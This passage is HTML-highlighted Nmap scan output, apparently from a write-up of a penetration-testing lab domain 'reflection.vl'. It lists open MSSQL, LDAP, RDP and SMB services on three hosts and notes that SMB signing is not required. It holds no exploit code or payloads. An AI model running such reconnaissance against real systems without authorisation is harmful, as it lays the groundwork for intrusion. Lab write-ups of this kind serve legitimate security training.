</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w> </span><span class=n>ms</span><span class=o>-</span><span class=k>sql</span><span class=o>-</span><span class=n>info</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w>   </span><span class=mi>10</span><span class=p>.</span><span class=mi>10</span><span class=p>.</span><span class=mi>228</span><span class=p>.</span><span class=mi>197</span><span class=p>:</span><span class=mi>1433</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w>     </span><span class=k>Version</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w>       </span><span class=n>name</span><span class=p>:</span><span class=w> </span><span class=n>Microsoft</span><span class=w> </span><span class=k>SQL</span><span class=w> </span><span class=n>Server</span><span class=w> </span><span class=mi>2019</span><span class=w> </span><span class=n>RTM</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w>       </span><span class=nb>number</span><span class=p>:</span><span class=w> </span><span class=mi>15</span><span class=p>.</span><span class=mi>00</span><span class=p>.</span><span class=mi>2000</span><span class=p>.</span><span class=mi>00</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w>       </span><span class=n>Product</span><span class=p>:</span><span class=w> </span><span class=n>Microsoft</span><span class=w> </span><span class=k>SQL</span><span class=w> </span><span class=n>Server</span><span class=w> </span><span class=mi>2019</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w>       </span><span class=n>Service</span><span class=w> </span><span class=n>pack</span><span class=w> </span><span class=k>level</span><span class=p>:</span><span class=w> </span><span class=n>RTM</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w>       </span><span class=n>Post</span><span class=o>-</span><span class=n>SP</span><span class=w> </span><span class=n>patches</span><span class=w> </span><span class=n>applied</span><span class=p>:</span><span class=w> </span><span class=k>false</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=n>_</span><span class=w>    </span><span class=n>TCP</span><span class=w> </span><span class=n>port</span><span class=p>:</span><span class=w> </span><span class=mi>1433</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=mi>3268</span><span class=o>/</span><span class=n>tcp</span><span class=w> </span><span class=k>open</span><span class=w>  </span><span class=n>ldap</span><span class=w>          </span><span class=n>Microsoft</span><span class=w> </span><span class=n>Windows</span><span class=w> </span><span class=n>Active</span><span class=w> </span><span class=n>Directory</span><span class=w> </span><span class=n>LDAP</span><span class=w> </span><span class=p>(</span><span class=k>Domain</span><span class=p>:</span><span class=w> </span><span class=n>reflection</span><span class=p>.</span><span class=n>vl0</span><span class=p>.,</span><span class=w> </span><span class=n>Site</span><span class=p>:</span><span class=w> </span><span class=k>Default</span><span class=o>-</span><span class=k>First</span><span class=o>-</span><span class=n>Site</span><span class=o>-</span><span class=n>Name</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=mi>3269</span><span class=o>/</span><span class=n>tcp</span><span class=w> </span><span class=k>open</span><span class=w>  </span><span class=n>tcpwrapped</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=mi>3389</span><span class=o>/</span><span class=n>tcp</span><span class=w> </span><span class=k>open</span><span class=w>  </span><span class=n>ms</span><span class=o>-</span><span class=n>wbt</span><span class=o>-</span><span class=n>server</span><span class=w> </span><span class=n>Microsoft</span><span class=w> </span><span class=n>Terminal</span><span class=w> </span><span class=n>Services</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w> </span><span class=n>rdp</span><span class=o>-</span><span class=n>ntlm</span><span class=o>-</span><span class=n>info</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w>   </span><span class=n>Target_Name</span><span class=p>:</span><span class=w> </span><span class=n>REFLECTION</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w>   </span><span class=n>NetBIOS_Domain_Name</span><span class=p>:</span><span class=w> </span><span class=n>REFLECTION</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w>   </span><span class=n>NetBIOS_Computer_Name</span><span class=p>:</span><span class=w> </span><span class=n>DC01</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w>   </span><span class=n>DNS_Domain_Name</span><span class=p>:</span><span class=w> </span><span class=n>reflection</span><span class=p>.</span><span class=n>vl</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w>   </span><span class=n>DNS_Computer_Name</span><span class=p>:</span><span class=w> </span><span class=n>dc01</span><span class=p>.</span><span class=n>reflection</span><span class=p>.</span><span class=n>vl</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w>   </span><span class=n>DNS_Tree_Name</span><span class=p>:</span><span class=w> </span><span class=n>reflection</span><span class=p>.</span><span class=n>vl</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w>   </span><span class=n>Product_Version</span><span class=p>:</span><span class=w> </span><span class=mi>10</span><span class=p>.</span><span class=mi>0</span><span class=p>.</span><span class=mi>20348</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=n>_</span><span class=w>  </span><span class=n>System_Time</span><span class=p>:</span><span class=w> </span><span class=mi>2024</span><span class=o>-</span><span class=mi>11</span><span class=o>-</span><span class=mi>05</span><span class=n>T08</span><span class=p>:</span><span class=mi>48</span><span class=p>:</span><span class=mi>24</span><span class=o>+</span><span class=mi>00</span><span class=p>:</span><span class=mi>00</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=n>_ssl</span><span class=o>-</span><span class=nb>date</span><span class=p>:</span><span class=w> </span><span class=mi>2024</span><span class=o>-</span><span class=mi>11</span><span class=o>-</span><span class=mi>05</span><span class=n>T08</span><span class=p>:</span><span class=mi>49</span><span class=p>:</span><span class=mi>05</span><span class=o>+</span><span class=mi>00</span><span class=p>:</span><span class=mi>00</span><span class=p>;</span><span class=w> </span><span class=o>-</span><span class=mi>1</span><span class=n>s</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>scanner</span><span class=w> </span><span class=n>time</span><span class=p>.</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w> </span><span class=n>ssl</span><span class=o>-</span><span class=n>cert</span><span class=p>:</span><span class=w> </span><span class=n>Subject</span><span class=p>:</span><span class=w> </span><span class=n>commonName</span><span class=o>=</span><span class=n>dc01</span><span class=p>.</span><span class=n>reflection</span><span class=p>.</span><span class=n>vl</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w> </span><span class=k>Not</span><span class=w> </span><span class=k>valid</span><span class=w> </span><span class=k>before</span><span class=p>:</span><span class=w> </span><span class=mi>2024</span><span class=o>-</span><span class=mi>11</span><span class=o>-</span><span class=mi>04</span><span class=n>T08</span><span class=p>:</span><span class=mi>42</span><span class=p>:</span><span class=mi>07</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=n>_Not</span><span class=w> </span><span class=k>valid</span><span class=w> </span><span class=k>after</span><span class=p>:</span><span class=w>  </span><span class=mi>2025</span><span class=o>-</span><span class=mi>05</span><span class=o>-</span><span class=mi>06</span><span class=n>T08</span><span class=p>:</span><span class=mi>42</span><span class=p>:</span><span class=mi>07</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>Service</span><span class=w> </span><span class=n>Info</span><span class=p>:</span><span class=w> </span><span class=k>Host</span><span class=p>:</span><span class=w> </span><span class=n>DC01</span><span class=p>;</span><span class=w> </span><span class=n>OS</span><span class=p>:</span><span class=w> </span><span class=n>Windows</span><span class=p>;</span><span class=w> </span><span class=n>CPE</span><span class=p>:</span><span class=w> </span><span class=n>cpe</span><span class=p>:</span><span class=o>/</span><span class=n>o</span><span class=p>:</span><span class=n>microsoft</span><span class=p>:</span><span class=n>windows</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>Host</span><span class=w> </span><span class=n>script</span><span class=w> </span><span class=n>results</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w> </span><span class=n>smb2</span><span class=o>-</span><span class=k>security</span><span class=o>-</span><span class=k>mode</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w>   </span><span class=mi>3</span><span class=p>:</span><span class=mi>1</span><span class=p>:</span><span class=mi>1</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=n>_</span><span class=w>    </span><span class=n>Message</span><span class=w> </span><span class=n>signing</span><span class=w> </span><span class=n>enabled</span><span class=w> </span><span class=n>but</span><span class=w> </span><span class=k>not</span><span class=w> </span><span class=n>required</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w> </span><span class=n>smb2</span><span class=o>-</span><span class=n>time</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w>   </span><span class=nb>date</span><span class=p>:</span><span class=w> </span><span class=mi>2024</span><span class=o>-</span><span class=mi>11</span><span class=o>-</span><span class=mi>05</span><span class=n>T08</span><span class=p>:</span><span class=mi>48</span><span class=p>:</span><span class=mi>25</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=n>_</span><span class=w>  </span><span class=n>start_date</span><span class=p>:</span><span class=w> </span><span class=n>N</span><span class=o>/</span><span class=n>A</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=n>_clock</span><span class=o>-</span><span class=n>skew</span><span class=p>:</span><span class=w> </span><span class=n>mean</span><span class=p>:</span><span class=w> </span><span class=o>-</span><span class=mi>1</span><span class=n>s</span><span class=p>,</span><span class=w> </span><span class=n>deviation</span><span class=p>:</span><span class=w> </span><span class=mi>0</span><span class=n>s</span><span class=p>,</span><span class=w> </span><span class=n>median</span><span class=p>:</span><span class=w> </span><span class=o>-</span><span class=mi>1</span><span class=n>s</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>Nmap</span><span class=w> </span><span class=n>scan</span><span class=w> </span><span class=n>report</span><span class=w> </span><span class=k>for</span><span class=w> </span><span class=mi>10</span><span class=p>.</span><span class=mi>10</span><span class=p>.</span><span class=mi>228</span><span class=p>.</span><span class=mi>198</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>Host</span><span class=w> </span><span class=k>is</span><span class=w> </span><span class=n>up</span><span class=w> </span><span class=p>(</span><span class=mi>0</span><span class=p>.</span><span class=mi>12</span><span class=n>s</span><span class=w> </span><span class=n>latency</span><span class=p>).</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>Not</span><span class=w> </span><span class=n>shown</span><span class=p>:</span><span class=w> </span><span class=mi>996</span><span class=w> </span><span class=n>filtered</span><span class=w> </span><span class=n>tcp</span><span class=w> </span><span class=n>ports</span><span class=w> </span><span class=p>(</span><span class=k>no</span><span class=o>-</span><span class=n>response</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>PORT</span><span class=w>     </span><span class=k>STATE</span><span class=w> </span><span class=n>SERVICE</span><span class=w>       </span><span class=k>VERSION</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=mi>135</span><span class=o>/</span><span class=n>tcp</span><span class=w>  </span><span class=k>open</span><span class=w>  </span><span class=n>msrpc</span><span class=w>         </span><span class=n>Microsoft</span><span class=w> </span><span class=n>Windows</span><span class=w> </span><span class=n>RPC</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=mi>445</span><span class=o>/</span><span class=n>tcp</span><span class=w>  </span><span class=k>open</span><span class=w>  </span><span class=n>microsoft</span><span class=o>-</span><span class=n>ds</span><span class=o>?</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=mi>1433</span><span class=o>/</span><span class=n>tcp</span><span class=w> </span><span class=k>open</span><span class=w>  </span><span class=n>ms</span><span class=o>-</span><span class=k>sql</span><span class=o>-</span><span class=n>s</span><span class=w>      </span><span class=n>Microsoft</span><span class=w> </span><span class=k>SQL</span><span class=w> </span><span class=n>Server</span><span class=w> </span><span class=mi>2019</span><span class=w> </span><span class=mi>15</span><span class=p>.</span><span class=mi>00</span><span class=p>.</span><span class=mi>2000</span><span class=p>.</span><span class=mi>00</span><span class=p>;</span><span class=w> </span><span class=n>RTM</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w> </span><span class=n>ssl</span><span class=o>-</span><span class=n>cert</span><span class=p>:</span><span class=w> </span><span class=n>Subject</span><span class=p>:</span><span class=w> </span><span class=n>commonName</span><span class=o>=</span><span class=n>SSL_Self_Signed_Fallback</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w> </span><span class=k>Not</span><span class=w> </span><span class=k>valid</span><span class=w> </span><span class=k>before</span><span class=p>:</span><span class=w> </span><span class=mi>2024</span><span class=o>-</span><span class=mi>11</span><span class=o>-</span><span class=mi>05</span><span class=n>T08</span><span class=p>:</span><span class=mi>42</span><span class=p>:</span><span class=mi>32</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=n>_Not</span><span class=w> </span><span class=k>valid</span><span class=w> </span><span class=k>after</span><span class=p>:</span><span class=w>  </span><span class=mi>2054</span><span class=o>-</span><span class=mi>11</span><span class=o>-</span><span class=mi>05</span><span class=n>T08</span><span class=p>:</span><span class=mi>42</span><span class=p>:</span><span class=mi>32</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w> </span><span class=n>ms</span><span class=o>-</span><span class=k>sql</span><span class=o>-</span><span class=n>ntlm</span><span class=o>-</span><span class=n>info</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w>   </span><span class=mi>10</span><span class=p>.</span><span class=mi>10</span><span class=p>.</span><span class=mi>228</span><span class=p>.</span><span class=mi>198</span><span class=p>:</span><span class=mi>1433</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w>     </span><span class=n>Target_Name</span><span class=p>:</span><span class=w> </span><span class=n>REFLECTION</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w>     </span><span class=n>NetBIOS_Domain_Name</span><span class=p>:</span><span class=w> </span><span class=n>REFLECTION</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w>     </span><span class=n>NetBIOS_Computer_Name</span><span class=p>:</span><span class=w> </span><span class=n>MS01</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w>     </span><span class=n>DNS_Domain_Name</span><span class=p>:</span><span class=w> </span><span class=n>reflection</span><span class=p>.</span><span class=n>vl</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w>     </span><span class=n>DNS_Computer_Name</span><span class=p>:</span><span class=w> </span><span class=n>ms01</span><span class=p>.</span><span class=n>reflection</span><span class=p>.</span><span class=n>vl</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w>     </span><span class=n>DNS_Tree_Name</span><span class=p>:</span><span class=w> </span><span class=n>reflection</span><span class=p>.</span><span class=n>vl</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=n>_</span><span class=w>    </span><span class=n>Product_Version</span><span class=p>:</span><span class=w> </span><span class=mi>10</span><span class=p>.</span><span class=mi>0</span><span class=p>.</span><span class=mi>20348</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w> </span><span class=n>ms</span><span class=o>-</span><span class=k>sql</span><span class=o>-</span><span class=n>info</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w>   </span><span class=mi>10</span><span class=p>.</span><span class=mi>10</span><span class=p>.</span><span class=mi>228</span><span class=p>.</span><span class=mi>198</span><span class=p>:</span><span class=mi>1433</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w>     </span><span class=k>Version</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w>       </span><span class=n>name</span><span class=p>:</span><span class=w> </span><span class=n>Microsoft</span><span class=w> </span><span class=k>SQL</span><span class=w> </span><span class=n>Server</span><span class=w> </span><span class=mi>2019</span><span class=w> </span><span class=n>RTM</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w>       </span><span class=nb>number</span><span class=p>:</span><span class=w> </span><span class=mi>15</span><span class=p>.</span><span class=mi>00</span><span class=p>.</span><span class=mi>2000</span><span class=p>.</span><span class=mi>00</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w>       </span><span class=n>Product</span><span class=p>:</span><span class=w> </span><span class=n>Microsoft</span><span class=w> </span><span class=k>SQL</span><span class=w> </span><span class=n>Server</span><span class=w> </span><span class=mi>2019</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w>       </span><span class=n>Service</span><span class=w> </span><span class=n>pack</span><span class=w> </span><span class=k>level</span><span class=p>:</span><span class=w> </span><span class=n>RTM</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w>       </span><span class=n>Post</span><span class=o>-</span><span class=n>SP</span><span class=w> </span><span class=n>patches</span><span class=w> </span><span class=n>applied</span><span class=p>:</span><span class=w> </span><span class=k>false</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=n>_</span><span class=w>    </span><span class=n>TCP</span><span class=w> </span><span class=n>port</span><span class=p>:</span><span class=w> </span><span class=mi>1433</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=n>_ssl</span><span class=o>-</span><span class=nb>date</span><span class=p>:</span><span class=w> </span><span class=mi>2024</span><span class=o>-</span><span class=mi>11</span><span class=o>-</span><span class=mi>05</span><span class=n>T08</span><span class=p>:</span><span class=mi>49</span><span class=p>:</span><span class=mi>06</span><span class=o>+</span><span class=mi>00</span><span class=p>:</span><span class=mi>00</span><span class=p>;</span><span class=w> </span><span class=mi>0</span><span class=n>s</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>scanner</span><span class=w> </span><span class=n>time</span><span class=p>.</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=mi>3389</span><span class=o>/</span><span class=n>tcp</span><span class=w> </span><span class=k>open</span><span class=w>  </span><span class=n>ms</span><span class=o>-</span><span class=n>wbt</span><span class=o>-</span><span class=n>server</span><span class=w> </span><span class=n>Microsoft</span><span class=w> </span><span class=n>Terminal</span><span class=w> </span><span class=n>Services</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w> </span><span class=n>rdp</span><span class=o>-</span><span class=n>ntlm</span><span class=o>-</span><span class=n>info</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w>   </span><span class=n>Target_Name</span><span class=p>:</span><span class=w> </span><span class=n>REFLECTION</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w>   </span><span class=n>NetBIOS_Domain_Name</span><span class=p>:</span><span class=w> </span><span class=n>REFLECTION</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w>   </span><span class=n>NetBIOS_Computer_Name</span><span class=p>:</span><span class=w> </span><span class=n>MS01</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w>   </span><span class=n>DNS_Domain_Name</span><span class=p>:</span><span class=w> </span><span class=n>reflection</span><span class=p>.</span><span class=n>vl</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w>   </span><span class=n>DNS_Computer_Name</span><span class=p>:</span><span class=w> </span><span class=n>ms01</span><span class=p>.</span><span class=n>reflection</span><span class=p>.</span><span class=n>vl</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w>   </span><span class=n>DNS_Tree_Name</span><span class=p>:</span><span class=w> </span><span class=n>reflection</span><span class=p>.</span><span class=n>vl</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w>   </span><span class=n>Product_Version</span><span class=p>:</span><span class=w> </span><span class=mi>10</span><span class=p>.</span><span class=mi>0</span><span class=p>.</span><span class=mi>20348</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=n>_</span><span class=w>  </span><span class=n>System_Time</span><span class=p>:</span><span class=w> </span><span class=mi>2024</span><span class=o>-</span><span class=mi>11</span><span class=o>-</span><span class=mi>05</span><span class=n>T08</span><span class=p>:</span><span class=mi>48</span><span class=p>:</span><span class=mi>25</span><span class=o>+</span><span class=mi>00</span><span class=p>:</span><span class=mi>00</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=n>_ssl</span><span class=o>-</span><span class=nb>date</span><span class=p>:</span><span class=w> </span><span class=mi>2024</span><span class=o>-</span><span class=mi>11</span><span class=o>-</span><span class=mi>05</span><span class=n>T08</span><span class=p>:</span><span class=mi>49</span><span class=p>:</span><span class=mi>06</span><span class=o>+</span><span class=mi>00</span><span class=p>:</span><span class=mi>00</span><span class=p>;</span><span class=w> </span><span class=mi>0</span><span class=n>s</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>scanner</span><span class=w> </span><span class=n>time</span><span class=p>.</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w> </span><span class=n>ssl</span><span class=o>-</span><span class=n>cert</span><span class=p>:</span><span class=w> </span><span class=n>Subject</span><span class=p>:</span><span class=w> </span><span class=n>commonName</span><span class=o>=</span><span class=n>ms01</span><span class=p>.</span><span class=n>reflection</span><span class=p>.</span><span class=n>vl</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w> </span><span class=k>Not</span><span class=w> </span><span class=k>valid</span><span class=w> </span><span class=k>before</span><span class=p>:</span><span class=w> </span><span class=mi>2024</span><span class=o>-</span><span class=mi>11</span><span class=o>-</span><span class=mi>04</span><span class=n>T08</span><span class=p>:</span><span class=mi>42</span><span class=p>:</span><span class=mi>01</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=n>_Not</span><span class=w> </span><span class=k>valid</span><span class=w> </span><span class=k>after</span><span class=p>:</span><span class=w>  </span><span class=mi>2025</span><span class=o>-</span><span class=mi>05</span><span class=o>-</span><span class=mi>06</span><span class=n>T08</span><span class=p>:</span><span class=mi>42</span><span class=p>:</span><span class=mi>01</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>Service</span><span class=w> </span><span class=n>Info</span><span class=p>:</span><span class=w> </span><span class=n>OS</span><span class=p>:</span><span class=w> </span><span class=n>Windows</span><span class=p>;</span><span class=w> </span><span class=n>CPE</span><span class=p>:</span><span class=w> </span><span class=n>cpe</span><span class=p>:</span><span class=o>/</span><span class=n>o</span><span class=p>:</span><span class=n>microsoft</span><span class=p>:</span><span class=n>windows</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>Host</span><span class=w> </span><span class=n>script</span><span class=w> </span><span class=n>results</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w> </span><span class=n>smb2</span><span class=o>-</span><span class=k>security</span><span class=o>-</span><span class=k>mode</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w>   </span><span class=mi>3</span><span class=p>:</span><span class=mi>1</span><span class=p>:</span><span class=mi>1</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=n>_</span><span class=w>    </span><span class=n>Message</span><span class=w> </span><span class=n>signing</span><span class=w> </span><span class=n>enabled</span><span class=w> </span><span class=n>but</span><span class=w> </span><span class=k>not</span><span class=w> </span><span class=n>required</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w> </span><span class=n>smb2</span><span class=o>-</span><span class=n>time</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w>   </span><span class=nb>date</span><span class=p>:</span><span class=w> </span><span class=mi>2024</span><span class=o>-</span><span class=mi>11</span><span class=o>-</span><span class=mi>05</span><span class=n>T08</span><span class=p>:</span><span class=mi>48</span><span class=p>:</span><span class=mi>31</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=n>_</span><span class=w>  </span><span class=n>start_date</span><span class=p>:</span><span class=w> </span><span class=n>N</span><span class=o>/</span><span class=n>A</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>Nmap</span><span class=w> </span><span class=n>scan</span><span class=w> </span><span class=n>report</span><span class=w> </span><span class=k>for</span><span class=w> </span><span class=mi>10</span><span class=p>.</span><span class=mi>10</span><span class=p>.</span><span class=mi>228</span><span class=p>.</span><span class=mi>199</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>Host</span><span class=w> </span><span class=k>is</span><span class=w> </span><span class=n>up</span><span class=w> </span><span class=p>(</span><span class=mi>0</span><span class=p>.</span><span class=mi>11</span><span class=n>s</span><span class=w> </span><span class=n>latency</span><span class=p>).</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>Not</span><span class=w> </span><span class=n>shown</span><span class=p>:</span><span class=w> </span><span class=mi>997</span><span class=w> </span><span class=n>filtered</span><span class=w> </span><span class=n>tcp</span><span class=w> </span><span class=n>ports</span><span class=w> </span><span class=p>(</span><span class=k>no</span><span class=o>-</span><span class=n>response</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>PORT</span><span class=w>     </span><span class=k>STATE</span><span class=w> </span><span class=n>SERVICE</span><span class=w>       </span><span class=k>VERSION</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=mi>135</span><span class=o>/</span><span class=n>tcp</span><span class=w>  </span><span class=k>open</span><span class=w>  </span><span class=n>msrpc</span><span class=w>         </span><span class=n>Microsoft</span><span class=w> </span><span class=n>Windows</span><span class=w> </span><span class=n>RPC</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=mi>445</span><span class=o>/</span><span class=n>tcp</span><span class=w>  </span><span class=k>open</span><span class=w>  </span><span class=n>microsoft</span><span class=o>-</span><span class=n>ds</span><span class=o>?</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=mi>3389</span><span class=o>/</span><span class=n>tcp</span><span class=w> </span><span class=k>open</span><span class=w>  </span><span class=n>ms</span><span class=o>-</span><span class=n>wbt</span><span class=o>-</span><span class=n>server</span><span class=w> </span><span class=n>Microsoft</span><span class=w> </span><span class=n>Terminal</span><span class=w> </span><span class=n>Services</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=n>_ssl</span><span class=o>-</span><span class=nb>date</span><span class=p>:</span><span class=w> </span><span class=mi>2024</span><span class=o>-</span><span class=mi>11</span><span class=o>-</span><span class=mi>05</span><span class=n>T08</span><span class=p>:</span><span class=mi>49</span><span class=p>:</span><span class=mi>05</span><span class=o>+</span><span class=mi>00</span><span class=p>:</span><span class=mi>00</span><span class=p>;</span><span class=w> </span><span class=o>-</span><span class=mi>1</span><span class=n>s</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>scanner</span><span class=w> </span><span class=n>time</span><span class=p>.</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w> </span><span class=n>ssl</span><span class=o>-</span><span class=n>cert</span><span class=p>:</span><span class=w> </span><span class=n>Subject</span><span class=p>:</span><span class=w> </span><span class=n>commonName</span><span class=o>=</span><span class=n>ws01</span><span class=p>.</span><span class=n>reflection</span><span class=p>.</span><span class=n>vl</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w> </span><span class=k>Not</span><span class=w> </span><span class=k>valid</span><span class=w> </span><span class=k>before</span><span class=p>:</span><span class=w> </span><span class=mi>2024</span><span class=o>-</span><span class=mi>11</span><span class=o>-</span><span class=mi>04</span><span class=n>T08</span><span class=p>:</span><span class=mi>43</span><span class=p>:</span><span class=mi>03</span><span class=w>
